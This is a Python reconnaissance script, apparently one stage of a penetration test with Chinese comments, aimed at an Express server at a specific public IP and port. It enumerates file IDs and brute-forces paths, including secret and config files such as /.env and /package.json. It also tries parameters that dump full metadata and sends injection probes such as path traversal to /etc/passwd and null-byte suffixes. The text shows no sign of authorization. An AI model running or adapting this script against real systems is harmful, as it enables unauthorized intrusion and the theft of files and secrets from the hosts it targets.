#!/usr/bin/env python3
"""
Stage 4: :3100/videoData/getFile 深度探测 + 完整端点矩阵 + Express 框架攻击面
"""
import json
import subprocess
import time

def curl_capture(url, method="GET", body=None, headers=None, timeout=15):
    cmd = ["curl", "-sS", "-k", "-o", "-", "-w", "\n[STATUS=%{http_code} SIZE=%{size_download} TIME=%{time_total} CT=%{content_type}]",
           "-X", method, "-H", "User-Agent: Mozilla/5.0 (Pentest)"]
    if headers:
        for k, v in headers.items():
            cmd += ["-H", f"{k}: {v}"]
    if body:
        cmd += ["-H", "Content-Type: application/json", "-d", json.dumps(body)]
    cmd.append(url)
    try:
        r = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout)
        out = r.stdout
        if "[STATUS=" in out:
            idx = out.rfind("[STATUS=")
            meta = out[idx:].strip()
            body_str = out[:idx].rstrip()
            return meta, body_str
        return "[NO META]", out
    except subprocess.TimeoutExpired:
        return "[TIMEOUT]", ""
    except Exception as e:
        return f"[ERR {e}]", ""

def main():
    print(f"[*] Stage 4: :3100/videoData/getFile 深度 + 完整端点矩阵 - {time.strftime('%Y-%m-%d %H:%M:%S')}")
    print(f"="*100)

    # ===== Step 1: :3100/videoData/getFile/<fileId 1-20> 探测 =====
    print("\n[STEP 1] :3100/videoData/getFile/<fileId 1-20> 探测")
    for fid in range(1, 21):
        meta, body = curl_capture(f"http://35.234.50.28:3100/videoData/getFile/{fid}")
        marker = "[200]" if "200" in meta else ("[404]" if "404" in meta else "[异常]")
        preview = body[:80].replace("\n", " ")
        print(f"  {marker} fileId={fid:3d}  {meta}  {preview}")

    # ===== Step 2: :3100/imageData/getFile/<fileId 1-20> 探测 =====
    print("\n[STEP 2] :3100/imageData/getFile/<fileId 1-20> 探测")
    for fid in range(1, 21):
        meta, body = curl_capture(f"http://35.234.50.28:3100/imageData/getFile/{fid}")
        marker = "[200]" if "200" in meta else ("[404]" if "404" in meta else "[异常]")
        preview = body[:80].replace("\n", " ")
        print(f"  {marker} fileId={fid:3d}  {meta}  {preview}")

    # ===== Step 3: :3100 完整端点矩阵 (Express 路径爆破) =====
    print("\n[STEP 3] :3100 完整端点矩阵 (Express 路径爆破)")
    # Express 常见路径 + EPCR 业务路径
    common_paths = [
        "/", "/index.html", "/index", "/status", "/info", "/health", "/api",
        "/v1", "/v2", "/admin", "/login", "/config", "/version",
        "/users", "/api/users", "/api/login",
        "/api/events", "/api/imageData", "/api/videoData", "/api/trendings",
        "/imageData", "/videoData", "/trendings", "/events",
        "/imageData/1", "/videoData/1", "/trendings/1", "/events/1",
        "/events/100", "/trendings/100",
        "/case", "/case/100", "/caseList",
        "/socket.io", "/socket.io/?EIO=4&transport=polling",
        "/static", "/public", "/uploads",
        "/.env", "/package.json", "/app.js", "/server.js",
        "/getfile", "/download", "/api/file",
        "/files", "/file", "/getFile",
    ]
    for path in common_paths:
        meta, body = curl_capture(f"http://35.234.50.28:3100{path}")
        marker = "[200]" if "200" in meta else ("[拒]" if "404" in meta or "401" in meta else "[超时]")
        # 仅显示有意义的响应
        if "SIZE=" in meta:
            size_str = meta.split("SIZE=")[1].split(" ")[0] if "SIZE=" in meta else "?"
            try:
                size = int(size_str)
                if size > 100:  # 仅显示有意义的响应
                    preview = body[:80].replace("\n", " ")
                    print(f"  {marker} {path:45s} {meta}  {preview}")
            except:
                pass

    # ===== Step 4: :3100 HEAD 探测 + 目录列表 =====
    print("\n[STEP 4] :3100 HEAD 探测")
    head_meta = curl_capture("http://35.234.50.28:3100/videoData/getFile/2", method="HEAD")
    print(f"  HEAD /videoData/getFile/2: {head_meta}")
    head_meta = curl_capture("http://35.234.50.28:3100/imageData/getFile/2", method="HEAD")
    print(f"  HEAD /imageData/getFile/2: {head_meta}")
    head_meta = curl_capture("http://35.234.50.28:3100/videoData/", method="HEAD")
    print(f"  HEAD /videoData/: {head_meta}")

    # ===== Step 5: 探索 videoData 元数据最大 fileId (翻页或全量 dump) =====
    print("\n[STEP 5] :3100/videoData 全量元数据 (尝试分页)")
    # 尝试 Loopback 风格 filter
    for q in ["", "?filter[limit]=500", "?page=1&limit=500", "?$limit=500", "?filter[skip]=0"]:
        meta, body = curl_capture(f"http://35.234.50.28:3100/videoData{q}")
        if "SIZE=" in meta:
            size_str = meta.split("SIZE=")[1].split(" ")[0]
            try:
                count = len(json.loads(body)) if body.startswith("[") else 0
            except:
                count = -1
            print(f"  videoData{q:30s} {meta}  count={count}")

    # ===== Step 6: 探针 :3100 错误处理 + XSS 注入面 =====
    print("\n[STEP 6] :3100 错误处理 / 注入面")
    err_probes = [
        "/imageData/getFile/999999",
        "/imageData/getFile/-1",
        "/imageData/getFile/0",
        "/imageData/getFile/abc",
        "/imageData/getFile/1%00",
        "/imageData/getFile/../../etc/passwd",
        "/videoData/getFile/999999",
        "/videoData/getFile/-1",
        "/videoData/getFile/0",
        "/videoData/getFile/abc",
        "/videoData/getFile/1%00",
    ]
    for path in err_probes:
        meta, body = curl_capture(f"http://35.234.50.28:3100{path}")
        marker = "[200]" if "200" in meta else ("[404]" if "404" in meta else "[异常]")
        preview = body[:120].replace("\n", " ")
        print(f"  {marker} {path:45s} {meta}  {preview}")

if __name__ == "__main__":
    main()